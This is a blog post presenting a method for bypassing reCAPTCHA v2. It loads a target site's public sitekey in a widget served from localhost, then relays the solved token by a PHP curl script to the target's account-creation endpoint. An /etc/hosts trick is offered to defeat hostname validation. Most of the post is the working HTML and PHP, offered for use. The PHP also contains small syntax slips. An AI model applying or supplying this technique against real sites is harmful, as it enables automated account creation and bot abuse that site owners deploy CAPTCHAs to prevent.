---
layout: post
title: Bypassing RecaptchaV2
---

A lot of times I hear people say that they use recaptchaV2 as a way to mitigate bot traffic. We have tried the same and the results have not been pretty, just as I anticipated. RecaptchaV2 is meant to stop scripts from performing actions against an application but there is no way that a macro-recording application that is interacting with a real browser can be stopped. 

What does this mean? Well, if you have an application that replays clicking on recorded coordinates from a real browser, there is no way recaptchaV2 can solve this. In fact, let me just show you.

# Bypassing recaptchaV2
A quick bypass/automating recaptchaV2 solution is as easy as follows:

* Apache web server
* PHP script receiving the g-captcha-response
* Public sitekey for target URL

You can set up an Apache web server running on http://localhost that loads a form that loads the recaptchaV2 widget and submits the response to a PHP script. The PHP script can receive the g-recaptcha-response parameter and send that via curl to the target URL with the rest of parameters that are needed to complete the action. 

> Google by default allows you to load recaptchaV2 widgets from localhost as a 'feature' for testing. There is no way to disable this.

## Example
Let's say that you want to bypass the recaptchaV2 for http://www.targetsite.com/create_account.action endpoint. This action takes a few parameters such as:
* username
* password
* gender
* city
* zip code
* address

What you can have is an Apache server serving an html file which loads the recaptchaV2 widget with:

```html
<html>
  <head>
    <title>reCAPTCHA demo: Simple page</title>
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  </head>
  <body>
    <form action="script.php" method="POST">
      <div class="g-recaptcha" data-sitekey="TARGET_SITE_KEY"></div>
      <br/>
      <input type="submit" value="Submit">
    </form>
  </body>
</html>
```

Then you can have a script.php file set to receive the response as:

```php
	$url = "https://www.targetsite.com/create_account.action";
	$response = $_POST['g-recaptcha-response'];
	$fields = array(
		'g-recaptcha-response' : $response,
		'username' : 'blah',
		'password' : 'password123', #of course!
		'gender' : 'm',
		'city' : 'Chicago',
		'state' : 'IL',
		'address' : '123 Elm St'
	);
	$fields_string = "";
	foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
	rtrim($fields_string, '&');

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, count($fields));
	curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
	$result = curl_exec($ch);
	curl_close($ch);
```

Bingo! That will submit a valid response to the target site with the rest of the parameters. When the target site sends the response to Google for verification, it'll receive a success of true and a hostname of 'localhost' because that's where the challenge was generated. If the site decides to perform hostname validation, then this attack will not work.

But wait... There's more!

If the site decides to perform hostname validation, this is what you can do:
* Create an /etc/hosts entry for the hostname of the target URL (www.targetsite.com)
* Have the PHP file send the response to another node (another VM) that then sends the parameters via curl.
* Hostname validation bypassed.

# References
[Google RecaptchaV2 Documentation](https://developers.google.com/recaptcha/intro)
	

